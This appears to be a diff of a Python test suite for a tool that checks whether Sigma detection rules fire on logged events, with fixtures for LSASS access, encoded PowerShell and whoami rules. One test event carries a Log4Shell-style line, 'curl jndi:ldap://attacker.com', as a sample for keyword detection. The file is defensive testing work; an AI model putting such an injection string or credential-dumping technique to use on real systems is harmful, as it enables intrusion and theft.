@@ -19,6 +19,9 @@ from detection_validator.normalizer.schema import (
     Severity,
 )
 from detection_validator.validator.matcher import (
+    _eval_field_condition,
+    _eval_group,
+    _eval_sigma_corpus,
     _keyword_tokens,
     _match_one,
     _match_techniques,
@@ -234,7 +237,8 @@ class TestLoadEvents:
 
 class TestMatchCorpus:
 
-    def test_pass_on_technique_hit(self, tmp_path: Path) -> None:
+    def test_technique_only_on_technique_hit(self, tmp_path: Path) -> None:
+        # No detection logic → field evaluation skipped → technique_only (not PASSED).
         path = tmp_path / "events.jsonl"
         _write_events(path, [
             {"technique": "T1190", "timestamp": _now_iso()},
@@ -243,7 +247,7 @@ class TestMatchCorpus:
         results = match_corpus([detection], path, since_hours=1)
 
         assert len(results) == 1
-        assert results[0].status == "likely_fires"
+        assert results[0].status == "technique_only"
         assert results[0].hit_count == 1
 
     def test_fail_on_no_matching_events(self, tmp_path: Path) -> None:
@@ -254,19 +258,22 @@ class TestMatchCorpus:
         detection = _make_detection(techniques=["T1190"])
         results = match_corpus([detection], path, since_hours=1)
 
-        assert results[0].status == "no_keyword_match"
+        assert results[0].status == "no_match"
         assert results[0].hit_count == 0
 
-    def test_keyword_match_from_detection_logic(self, tmp_path: Path) -> None:
+    def test_keyword_only_from_detection_logic(self, tmp_path: Path) -> None:
         path = tmp_path / "events.jsonl"
         _write_events(path, [
             {"proctitle": "curl jndi:ldap://attacker.com", "timestamp": _now_iso()},
         ])
-        # Detection with no technique but with keyword in raw Sigma logic → keyword_partial
-        detection = _make_detection(raw_logic="detection:\n  keywords:\n    - jndi")
+        # keywords-only Sigma rule → untranslatable (no field groups) → falls to
+        # keyword tier → keyword_only (not PASSED).
+        detection = _make_detection(raw_logic=(
+            "detection:\n  keywords:\n    - jndi\ncondition: keywords"
+        ))
         results = match_corpus([detection], path, since_hours=1)
 
-        assert results[0].status == "keyword_partial"
+        assert results[0].status == "keyword_only"
 
     def test_skip_when_no_techniques_and_no_keywords(self, tmp_path: Path) -> None:
         path = tmp_path / "events.jsonl"
@@ -294,8 +301,8 @@ class TestMatchCorpus:
 
         assert len(results) == 2
         statuses = {r.name: r.status for r in results}
-        assert statuses["Rule A"] == "likely_fires"
-        assert statuses["Rule B"] == "no_keyword_match"
+        assert statuses["Rule A"] == "technique_only"   # no field logic → not PASSED
+        assert statuses["Rule B"] == "no_match"
 
     def test_since_hours_zero_matches_all(self, tmp_path: Path) -> None:
         path = tmp_path / "events.jsonl"
@@ -305,7 +312,7 @@ class TestMatchCorpus:
         detection = _make_detection(techniques=["T1190"])
         results = match_corpus([detection], path, since_hours=0)
 
-        assert results[0].status == "likely_fires"
+        assert results[0].status == "technique_only"
 
     def test_result_siem_is_local(self, tmp_path: Path) -> None:
         path = tmp_path / "events.jsonl"
@@ -324,3 +331,228 @@ class TestMatchCorpus:
 
         assert len(results[0].sample_events) == 1
         assert results[0].sample_events[0]["technique"] == "T1190"
+
+
+# ── Unit: _eval_field_condition and _eval_group ───────────────────────────────
+
+
+class TestEvalFieldCondition:
+
+    def test_exact_match(self) -> None:
+        assert _eval_field_condition("Image", r"C:\Windows\cmd.exe", {"Image": r"C:\Windows\cmd.exe"})
+
+    def test_exact_no_match(self) -> None:
+        assert not _eval_field_condition("Image", "powershell.exe", {"Image": "cmd.exe"})
+
+    def test_contains_match(self) -> None:
+        assert _eval_field_condition("CommandLine|contains", "whoami", {"CommandLine": "cmd.exe /c whoami"})
+
+    def test_contains_no_match(self) -> None:
+        assert not _eval_field_condition("CommandLine|contains", "whoami", {"CommandLine": "calc.exe"})
+
+    def test_startswith(self) -> None:
+        assert _eval_field_condition("Image|startswith", r"C:\Windows", {"Image": r"C:\Windows\System32\cmd.exe"})
+
+    def test_endswith(self) -> None:
+        assert _eval_field_condition("Image|endswith", "lsass.exe", {"Image": r"C:\Windows\System32\lsass.exe"})
+
+    def test_list_value_any_matches(self) -> None:
+        # OR semantics for list values
+        assert _eval_field_condition("Image|endswith", ["cmd.exe", "powershell.exe"], {"Image": r"C:\powershell.exe"})
+
+    def test_list_value_none_matches(self) -> None:
+        assert not _eval_field_condition("Image|endswith", ["cmd.exe", "mshta.exe"], {"Image": r"C:\calc.exe"})
+
+    def test_missing_field_returns_false(self) -> None:
+        assert not _eval_field_condition("NonExistentField", "value", {"Image": "cmd.exe"})
+
+    def test_case_insensitive_field_lookup(self) -> None:
+        # event key casing differs from Sigma field name
+        assert _eval_field_condition("commandline|contains", "whoami", {"CommandLine": "whoami /all"})
+
+    def test_case_insensitive_value_match(self) -> None:
+        assert _eval_field_condition("Image|endswith", "CMD.EXE", {"Image": r"C:\Windows\cmd.exe"})
+
+
+class TestEvalGroup:
+
+    def test_all_fields_match(self) -> None:
+        group = {
+            "Image|endswith": "lsass.exe",
+            "GrantedAccess|contains": "0x1010",
+        }
+        event = {"Image": r"C:\Windows\lsass.exe", "GrantedAccess": "0x1010"}
+        assert _eval_group(group, event)
+
+    def test_partial_field_match_fails(self) -> None:
+        # Field A matches but field B does not → group requires AND → False
+        group = {
+            "Image|endswith": "lsass.exe",
+            "GrantedAccess|contains": "0x1410",
+        }
+        event = {"Image": r"C:\Windows\lsass.exe", "GrantedAccess": "0x0000"}
+        assert not _eval_group(group, event)
+
+    def test_empty_group_matches(self) -> None:
+        # Empty group has no conditions → vacuously True
+        assert _eval_group({}, {"anything": "value"})
+
+
+# ── Required acceptance tests (spec §a, §b, §c) ──────────────────────────────
+
+
+_SIGMA_AND_RULE = """\
+title: LSASS Access with Specific GrantedAccess
+detection:
+  selection:
+    Image|endswith: 'lsass.exe'
+    GrantedAccess|contains: '0x1410'
+  condition: selection
+"""
+
+_SIGMA_FULL_MATCH_RULE = """\
+title: Suspicious PowerShell Encoded Command
+detection:
+  selection:
+    Image|endswith: 'powershell.exe'
+    CommandLine|contains: '-EncodedCommand'
+  condition: selection
+"""
+
+_SIGMA_UNSUPPORTED_CONDITION = """\
+title: Complex near() condition
+detection:
+  sel1:
+    Image|endswith: 'cmd.exe'
+  sel2:
+    CommandLine|contains: 'whoami'
+  condition: sel1 near sel2
+"""
+
+
+class TestAcceptanceCriteria:
+    """Spec §a / §b / §c from the task brief."""
+
+    # ── §a: partial field match must NOT be PASSED ────────────────────────────
+
+    def test_partial_field_match_is_technique_only_not_passed(self, tmp_path: Path) -> None:
+        """
+        Rule requires Image|endswith lsass.exe AND GrantedAccess|contains 0x1410.
+        Corpus has an event with only Image matching (GrantedAccess missing).
+        Must produce technique_only (or no_match), never condition_match/PASSED.
+        """
+        path = tmp_path / "events.jsonl"
+        _write_events(path, [{
+            "technique": "T1003.001",
+            "Image": r"C:\Windows\System32\lsass.exe",
+            # GrantedAccess intentionally absent
+            "timestamp": _now_iso(),
+        }])
+        detection = _make_detection(
+            techniques=["T1003.001"],
+            raw_logic=_SIGMA_AND_RULE,
+        )
+        results = match_corpus([detection], path, since_hours=1)
+
+        assert results[0].status != "condition_match", (
+            "Partial field match must not produce condition_match"
+        )
+        assert results[0].status == "technique_only", (
+            f"Expected technique_only, got {results[0].status}"
+        )
+        from detection_validator.normalizer.schema import ValidationStatus
+        assert detection.validation_status != ValidationStatus.PASSED
+
+    def test_both_fields_absent_is_not_passed(self, tmp_path: Path) -> None:
+        """Even with a technique-matching event, absent fields → not PASSED."""
+        path = tmp_path / "events.jsonl"
+        _write_events(path, [{
+            "technique": "T1003.001",
+            "timestamp": _now_iso(),
+        }])
+        detection = _make_detection(
+            techniques=["T1003.001"],
+            raw_logic=_SIGMA_AND_RULE,
+        )
+        results = match_corpus([detection], path, since_hours=1)
+        assert results[0].status == "technique_only"
+
+    # ── §b: full field match → condition_match / PASSED ──────────────────────
+
+    def test_full_field_match_is_condition_match_and_passed(self, tmp_path: Path) -> None:
+        """
+        Rule requires Image|endswith powershell.exe AND CommandLine|contains -EncodedCommand.
+        Corpus has an event satisfying both fields → condition_match → PASSED.
+        """
+        path = tmp_path / "events.jsonl"
+        _write_events(path, [{
+            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "CommandLine": "powershell.exe -EncodedCommand SQBFAFgA",
+            "timestamp": _now_iso(),
+        }])
+        detection = _make_detection(
+            techniques=["T1059.001"],
+            raw_logic=_SIGMA_FULL_MATCH_RULE,
+        )
+        results = match_corpus([detection], path, since_hours=1)
+
+        assert results[0].status == "condition_match"
+        assert results[0].hit_count >= 1
+        from detection_validator.normalizer.schema import ValidationStatus
+        assert detection.validation_status == ValidationStatus.PASSED
+
+    def test_condition_match_with_no_technique_in_event(self, tmp_path: Path) -> None:
+        """Field logic match is independent of technique field in the event."""
+        path = tmp_path / "events.jsonl"
+        _write_events(path, [{
+            "Image": r"C:\powershell.exe",
+            "CommandLine": "powershell.exe -EncodedCommand abc",
+            "timestamp": _now_iso(),
+        }])
+        detection = _make_detection(
+            techniques=["T1059.001"],
+            raw_logic=_SIGMA_FULL_MATCH_RULE,
+        )
+        results = match_corpus([detection], path, since_hours=1)
+        assert results[0].status == "condition_match"
+
+    # ── §c: unsupported condition → untranslatable ────────────────────────────
+
+    def test_unsupported_condition_is_untranslatable(self, tmp_path: Path) -> None:
+        """
+        A condition using 'near' (not in the supported set) must produce
+        'untranslatable' and must NOT fall through to technique_only.
+        """
+        path = tmp_path / "events.jsonl"
+        _write_events(path, [{
+            "technique": "T1059.003",
+            "Image": r"C:\cmd.exe",
+            "CommandLine": "whoami",
+            "timestamp": _now_iso(),
+        }])
+        detection = _make_detection(
+            techniques=["T1059.003"],
+            raw_logic=_SIGMA_UNSUPPORTED_CONDITION,
+        )
+        results = match_corpus([detection], path, since_hours=1)
+
+        assert results[0].status == "untranslatable", (
+            f"Expected untranslatable, got {results[0].status}"
+        )
+        assert results[0].error, "untranslatable result must carry an error string"
+        assert results[0].status != "technique_only", (
+            "Must not silently fall through to technique_only"
+        )
+        from detection_validator.normalizer.schema import ValidationStatus
+        assert detection.validation_status != ValidationStatus.PASSED
+
+    def test_untranslatable_carries_condition_name(self, tmp_path: Path) -> None:
+        """Error string must name the unsupported pattern."""
+        path = tmp_path / "events.jsonl"
+        _write_events(path, [{"technique": "T1059.003", "timestamp": _now_iso()}])
+        detection = _make_detection(
+            techniques=["T1059.003"],
+            raw_logic=_SIGMA_UNSUPPORTED_CONDITION,
+        )
+        results = match_corpus([detection], path, since_hours=1)
+        assert "near" in results[0].error.lower() or "unsupported" in results[0].error.lower()
